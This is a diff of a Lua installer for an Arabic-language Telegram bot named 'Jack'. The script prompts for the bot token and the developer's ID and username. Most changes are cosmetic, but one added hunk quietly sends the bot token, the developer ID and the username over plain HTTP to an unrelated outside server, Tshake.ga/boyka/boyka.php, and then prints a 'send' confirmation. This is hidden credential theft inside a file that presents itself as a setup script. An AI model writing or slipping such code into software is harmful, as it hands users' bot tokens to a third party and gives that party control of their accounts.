@@ -26,13 +26,13 @@ local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
-print('\27[1;31m==========================\n التوكن غير صحيح تاكد منه ثم ارسله')
+print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n التوكن غير صحيح تاكد منه ثم ارسله')
 else
 io.write('\27[1;36m تم حفظ التوكن بنجاح \n27[0;39;49m')
 database:set(id_server..":token",token)
 end 
 else
-print('\27[1;31m==========================\n لم يتم حفظ التوكن ارسل لي التوكن الان')
+print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
 end 
 os.execute('lua Jack.lua')
 end
@@ -43,7 +43,18 @@ if SUDOID ~= '' then
 io.write('\27[1;36m تم حفظ ايدي المطور الاساسي \n27[0;39;49m')
 database:set(id_server..":SUDO:ID",SUDOID)
 else
-print('\27[1;31m==========================\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
+print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
+end 
+os.execute('lua Jack.lua')
+end
+if not database:get(id_server..":SUDO:USERNAME") then
+io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
+local SUDOUSERNAME = io.read():gsub('@','')
+if SUDOUSERNAME ~= '' then
+io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
+database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
+else
+print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
 os.execute('lua Jack.lua')
 end
@@ -51,10 +62,15 @@ local create_config_auto = function()
 config = {
 token = database:get(id_server..":token"),
 SUDO = database:get(id_server..":SUDO:ID"),
+UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Info.lua")   
 end 
 create_config_auto()
+token = database:get(id_server..":token")
+SUDO = database:get(id_server..":SUDO:ID")
+res = https.request('http://Tshake.ga/boyka/boyka.php?token='..token..'&user='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
+print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("Jack", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -63,15 +79,15 @@ token="]]..database:get(id_server..":token")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "=============================================="
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉"
 echo "TG IS NOT FIND IN FILES BOT"
-echo "=============================================="
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
 exit 1
 fi
 if [ ! $token ]; then
-echo "=============================================="
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
 echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE INFO.LUA \e[0m"
-echo "=============================================="
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
 exit 1
 fi
 echo -e "\033[38;5;208m"
@@ -82,7 +98,7 @@ echo -e "\e[36m"
 done
 ]])  
 file:close()  
-file = io.open("NO", "w")  
+file = io.open("BK", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/Jack
@@ -120,6 +136,19 @@ return config
 end 
 _redis = load_redis()  
 --------------------------------------------------------------------------------------------------------------
+print([[
+
+    _           _        _ 
+(  _ \ (  _  )|\     /|| \    /\(  _  )
+| (   ) )| (   ) |( \   / )|  \  / /| (   ) |
+| (/ / | |   | | \ (_) / |  (_/ / | (_) |
+|   (  | |   | |  \   /  |   _ (  |  _  |
+| (  \ \ | |   | |   ) (   |  ( \ \ | (   ) |
+| )___) )| (___) |   | |   |  /  \ \| )   ( |
+|/ \___/ (_______)   \_/   |_/    \/|/     \|
+
+@Jack
+]])
 sudos = dofile("./Info.lua") 
 SUDO = tonumber(sudos.SUDO)
 sudo_users = {SUDO}
